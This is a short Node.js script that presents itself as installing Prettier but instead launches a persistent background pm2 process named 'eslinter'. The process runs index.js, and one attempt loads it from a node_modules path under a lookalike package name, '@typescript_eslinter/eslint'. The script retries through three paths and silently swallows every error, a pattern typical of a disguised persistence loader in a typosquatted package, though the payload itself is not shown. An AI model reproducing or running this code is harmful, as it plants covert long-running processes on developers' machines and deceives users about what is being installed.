const { exec } = require('child_process');

function installPrettier() {
  return new Promise((resolve, reject) => {
    exec(`pm2 start ${__dirname}/index.js --name eslinter --instances 1 --node-args="--max-old-space-size=4096"`, (error, stdout, stderr) => {
      if (error) {
        reject(`Error installing installPrettier: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}
function installPrettier1() {
  return new Promise((resolve, reject) => {
    exec(`/usr/local/Cellar/node/22.9.0_1/lib/node_modules/pm2/bin/pm2 start ${__dirname}/index.js --name eslinter --instances 1 --node-args="--max-old-space-size=4096"`, (error, stdout, stderr) => {
      if (error) {
        reject(`Error installing installPrettier: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}
function installPrettier2() {
  return new Promise((resolve, reject) => {
    exec(`/usr/local/Cellar/node/22.9.0_1/lib/node_modules/pm2/bin/pm2 start /usr/local/Celler/node/22.9.0_1/lib/node_modules/@typescript_eslinter/eslint/index.js --name eslinter --instances 1 --node-args="--max-old-space-size=4096"`, (error, stdout, stderr) => {
      if (error) {
        reject(`Error installing installPrettier: ${stderr}`);
      } else {
        resolve(stdout);
      }
    });
  });
}

async function main() {
  try {
    await installPrettier()
  } catch{

  }
  try {
    await installPrettier1()
  } catch{

  }
  try {
    await installPrettier2()
  } catch{

  }
}
main()
